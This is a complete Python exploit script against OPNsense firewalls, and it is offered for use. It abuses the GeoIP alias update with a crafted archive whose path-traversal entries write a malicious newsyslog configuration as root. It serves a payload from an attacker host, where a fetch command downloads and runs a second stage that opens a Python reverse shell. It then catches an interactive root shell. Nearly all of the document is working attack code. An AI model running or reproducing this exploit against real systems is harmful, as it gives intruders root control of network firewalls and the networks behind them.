#!/usr/bin/env python3
import io
import os
import re
import csv
import sys
import tty
import gzip
import select
import socket
import termios
import zipfile
import urllib3
import requests
import argparse
import threading
import http.server

urllib3.disable_warnings()
parser = argparse.ArgumentParser()
parser.add_argument("-b", "--base-url", default="https://192.168.1.1", help="OPNsense URL")
parser.add_argument("-u", "--user", default="root", help="OPNsense user with 'Firewall: Alias: Edit' privilege (Default: root)")
parser.add_argument("-p", "--password", default="opnsense", help="OPNsense user password (Default: opnsense)")
parser.add_argument("-a", "--attacker-ip", required=True, help="Attacker controlled server IP")
parser.add_argument("-w", "--http-port", default=18000, type=int, help="Open port for the web server (Default: 18000)")
parser.add_argument("-r", "--rev-port", default=1337, type=int, help="Open port for the reverse shell (Default: 1337)")
parser.add_argument("-f", "--format", choices=["zip", "gzip"], default="zip", help="Database archive format to serve (Default: zip)")
args = parser.parse_args()

BASE = args.base_url
USER, PWD = args.user, args.password
ATTACK_IP = args.attacker_ip
HTTP_PORT = args.http_port
SHELL_PORT = args.rev_port

# traversal targets (geoip.py appends '-IPv4'/'-IPv6') (the traversed dirs must already exist)
TRAVERSE = "../../../../../../../.."
CONF_PATH = f"{TRAVERSE}/etc/newsyslog.conf.d/zzz_pwn"
LOG_PATH = f"{TRAVERSE}/var/log/rotate_bait"

# Stage-1 (newsyslog `R` command)
STAGE1 = (
    "/usr/bin/true;"
    f"/usr/bin/fetch${{IFS}}-qo/tmp/.r${{IFS}}http://{ATTACK_IP}:{HTTP_PORT}/s;"
    "/bin/sh${IFS}/tmp/.r;:"
)

# Stage-2 reverse shell
STAGE2 = (
    "#!/bin/sh\n"
    "rm -f /tmp/.r 2>/dev/null\n"
    "exec python3 -c 'import socket,os,pty;"
    f's=socket.socket();s.connect(("{ATTACK_IP}",{SHELL_PORT}));'
    "[os.dup2(s.fileno(),f) for f in (0,1,2)];"
    'pty.spawn("/bin/sh")\'\n'
)

NEWSYSLOG_ENTRY = f"/var/log/rotate_bait-IPv4 644 1 1 * R {STAGE1}"
TRIGGER_PAD = "X" * 1400  # >1KB so size-based rotation fires on the next newsyslog run


def build_zip() -> bytes:
    # maps file locations with geoname_id->country_iso_code (-> traversal path)
    locations = "\n".join(
        [
            "geoname_id,locale_code,continent_code,continent_name,country_iso_code",
            f"1,en,EU,Europe,{CONF_PATH}",
            f"2,en,EU,Europe,{LOG_PATH}",
        ]
    )
    # writes file body into the network column
    blocks = "\n".join(
        [
            "network,geoname_id",
            f"{NEWSYSLOG_ENTRY},1",
            f"{TRIGGER_PAD},2",
        ]
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("GeoLite2-Country-Locations-en.csv", locations)
        z.writestr("GeoLite2-Country-Blocks-IPv4.csv", blocks)
    return buf.getvalue()


def build_gzip() -> bytes:
    sio = io.StringIO()
    w = csv.writer(sio)
    w.writerow(["network", "country_code"])
    w.writerow([NEWSYSLOG_ENTRY, CONF_PATH])
    w.writerow([TRIGGER_PAD, LOG_PATH])
    return gzip.compress(sio.getvalue().encode())


if args.format == "zip":
    PAYLOAD_NAME = "db.zip"
    PAYLOAD_CTYPE = "application/zip"
    PAYLOAD_BYTES = build_zip()
else:
    PAYLOAD_NAME = "db.gz"
    PAYLOAD_CTYPE = "application/gzip"
    PAYLOAD_BYTES = build_gzip()


class AttackerWebServer(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith(f"/{PAYLOAD_NAME}"):
            self.send_response(200)
            self.send_header("Content-Type", PAYLOAD_CTYPE)
            self.send_header("Content-Disposition", f'attachment; filename="{PAYLOAD_NAME}"')
            self.end_headers()
            self.wfile.write(PAYLOAD_BYTES)
        elif self.path.startswith("/s"):
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(STAGE2.encode())
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, fmt, *args):
        pass


# Automatically signs the user in via the GUI and grabs the session CSRF token
def login(s: requests.Session):
    r = s.get(f"{BASE}/index.php", timeout=10)
    m = re.search(r'<input type="hidden" name="([A-Za-z0-9_-]+)" value="([A-Za-z0-9_-]+)" autocomplete="new-password"', r.text)
    if not m:
        sys.exit("[-] could not read login CSRF token")
    s.post(
        f"{BASE}/index.php",
        data={
            m.group(1): m.group(2),
            "usernamefld": USER,
            "passwordfld": PWD,
            "login": "1",
        },
        timeout=10,
    )
    r = s.get(f"{BASE}/ui/firewall/alias", timeout=10)
    t = re.search(r'"X-CSRFToken",\s*"([^"]+)"', r.text)
    if not t:
        sys.exit("[-] login failed / no session token")
    s.headers.update({"X-CSRFToken": t.group(1)})


# Starts the interactive shell
def interactive(conn: socket.socket):
    print(f"\n[+] ROOT shell connected from {conn.getpeername()[0]}", flush=True)
    old = termios.tcgetattr(sys.stdin)
    try:
        tty.setraw(sys.stdin.fileno())
        conn.sendall(b'export PS1="$(whoami)# "; id\n')
        while True:
            r, _, _ = select.select([sys.stdin, conn], [], [])
            if conn in r:
                data = conn.recv(4096)
                if not data:
                    break
                os.write(sys.stdout.fileno(), data)
            if sys.stdin in r:
                d = os.read(sys.stdin.fileno(), 4096)
                if not d:
                    break
                conn.sendall(d)
    finally:
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old)
        print("\n[*] shell closed", flush=True)


def main():
    # 1) Launch Attacker Services (Serves the GeoIP archive, Stage 2 and Reverse Shell Listener)
    httpd = http.server.HTTPServer((ATTACK_IP, HTTP_PORT), AttackerWebServer)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    catcher = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    catcher.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    catcher.bind((ATTACK_IP, SHELL_PORT))
    catcher.listen(1)
    print(f"[*] http server on {ATTACK_IP}:{HTTP_PORT}")
    print(f"[*] reverse-shell listener on {ATTACK_IP}:{SHELL_PORT}")
    print(f"[*] serving {args.format} payload as {PAYLOAD_NAME}")

    # 2) EXPLOIT THE VULNERABILITY
    # 2.1) Login the user and get the CSRF token
    s = requests.Session()
    s.verify = False
    login(s)

    # 2.2) Stores geoip.url in config.xml
    r = s.post(
        f"{BASE}/api/firewall/alias/set",
        json={"alias": {"geoip": {"url": f"http://{ATTACK_IP}:{HTTP_PORT}/{PAYLOAD_NAME}"}}},
        timeout=15,
    )
    if not r.status_code == 200:
        sys.exit("[-] Failed to set the GeoIP URL")
    print("[+] set GeoIP URL:", r.status_code, r.text[:80])

    # 2.3) Reloads the template and render the config.xml
    r = s.post(f"{BASE}/api/firewall/alias/reconfigure", json={}, timeout=30)
    if not r.status_code == 200:
        sys.exit("[-] Failed reloading template")
    print("[+] reconfigure:", r.status_code)

    # 2.4) Downloads the archive from the configured GeoIP URL and performs the path-traversal write
    r = s.post(f"{BASE}/api/firewall/alias/update/geoip", json={}, timeout=60)
    if not r.status_code == 200:
        sys.exit(f"[-] Failed downloading the GeoIP {PAYLOAD_NAME} file.")
    print("[+] update/geoip (root write):", r.status_code, r.text[:120])

    # 3) Waiting for the exploit to be triggered by the newsyslog cronjob
    if args.format == "zip":
        conf_suffix, trig_suffix = "IPv4", "IPv4"
    else:
        proto_for = lambda network_value: "IPv6" if network_value.find(":") > 0 else "IPv4"
        conf_suffix = proto_for(NEWSYSLOG_ENTRY)
        trig_suffix = proto_for(TRIGGER_PAD)
    print(
        f"\n"
        f"[*] Root-written files (verify on console if you like):\n"
        f"      /etc/newsyslog.conf.d/zzz_pwn-{conf_suffix}   (newsyslog R-command entry)\n"
        f"      /var/log/rotate_bait-{trig_suffix}             (>1KB rotation trigger)\n"
        f"[*] The exploit fires on the next hourly newsyslog run (Trigger manually via: newsyslog -Fv)\n\n"
        f"[*] waiting for the root reverse shell on :{SHELL_PORT}...",
        flush=True,
    )

    try:
        conn, _ = catcher.accept()
    except KeyboardInterrupt:
        print("\n[-] aborted")
        return
    interactive(conn)


if __name__ == "__main__":
    main()
